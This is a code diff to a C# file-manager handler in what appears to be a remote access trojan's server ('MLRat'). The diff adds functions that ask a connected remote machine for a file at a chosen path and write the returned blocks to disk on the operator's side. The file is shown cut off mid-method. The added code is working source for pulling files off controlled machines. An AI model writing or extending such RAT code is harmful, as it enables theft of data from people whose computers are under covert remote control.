@@ -1,11 +1,14 @@
-﻿using MLManagementServer.Forms;
+﻿using MLManagementServer.CustomObjects;
+using MLManagementServer.Forms;
 using MLRat.Server;
 using SharedCode.Network;
 using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace MLManagementServer.Handlers
 {
@@ -13,6 +16,7 @@ namespace MLManagementServer.Handlers
     {
         static Dictionary<Guid, FileExplorerForm> FormHandler = new Dictionary<Guid, FileExplorerForm>();
         static IServerUIHandler UIHost = null;
+        private static Dictionary<string, DownloadingFileInfo> DownloadHandler = new Dictionary<string, DownloadingFileInfo>();
         public static void SetUIHost(IServerUIHandler handler)
         {
             UIHost = handler;
@@ -34,12 +38,75 @@ namespace MLManagementServer.Handlers
             }
         }
 
+        public static void StartDownload(IClient c, string remotePath)
+        {
+            try
+            {
+                string downloadLocation = string.Empty;
+                using (SaveFileDialog sfd = new SaveFileDialog())
+                {
+                    sfd.FileName = Path.GetFileName(remotePath);
+                    if (sfd.ShowDialog() != DialogResult.OK)
+                        return;
+                    downloadLocation = sfd.FileName;
+                }
+
+                string id = Guid.NewGuid().ToString("n");
+                while (DownloadHandler.ContainsKey(id))
+                    id = Guid.NewGuid().ToString("n");
+
+                FileStream fs = new FileStream(downloadLocation, FileMode.Create, FileAccess.Write);
+                DownloadingFileInfo dfi = new DownloadingFileInfo();
+                dfi.DownloadLocation = downloadLocation;
+                dfi.Stream = fs;
+                DownloadHandler.Add(id, dfi);
+                c.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.StartDownload, id, remotePath);
+            }
+            catch
+            {
+                MessageBox.Show("Failed to start download");
+            }
+        }
+
         public static void Handle(IClient c, object[] data)
         {
-            if(FormHandler.ContainsKey(c.ID))
+            FileManagerCommand command = (FileManagerCommand)data[1];
+
+            if (command == FileManagerCommand.DownloadInvalid)
             {
-                FileManagerCommand command = (FileManagerCommand)data[1];
+                string downloadHandle = (string)data[2];
+                if (!DownloadHandler.ContainsKey(downloadHandle))
+                    return;
+                MessageBox.Show("Download is invalid: \n" + (string)data[3]);
+                DownloadHandler[downloadHandle].Stream.Close();
+                DownloadHandler[downloadHandle].Stream.Dispose();
+                DownloadHandler.Remove(downloadHandle);
+            }
+
+            if (command == FileManagerCommand.DownloadBlock)
+            {
+                string downloadHandle = (string)data[2];
+                if (!DownloadHandler.ContainsKey(downloadHandle))
+                    return;
+                byte[] block = (byte[])data[3];
+                bool finalBlock = (bool)data[4];
+                DownloadHandler[downloadHandle].Stream.Write(block, 0, block.Length);
+                if (finalBlock)
+                {
+                    DownloadHandler[downloadHandle].Stream.Close();
+                    DownloadHandler[downloadHandle].Stream.Dispose();
+                    DownloadHandler[downloadHandle].Stream = null;
+                    MessageBox.Show(string.Format("Download Complete!\nLocation: {0}", DownloadHandler[downloadHandle].DownloadLocation));
+                    DownloadHandler.Remove(downloadHandle);
+                }
+            }
+            if (FormHandler.ContainsKey(c.ID))
+            {
+                
                 Console.WriteLine("File Manager: {0}", command.ToString());
+
+                
+
                 if (command == FileManagerCommand.DriveResponce)
                 {
                     FormHandler[c.ID].BeginUpdate(false);
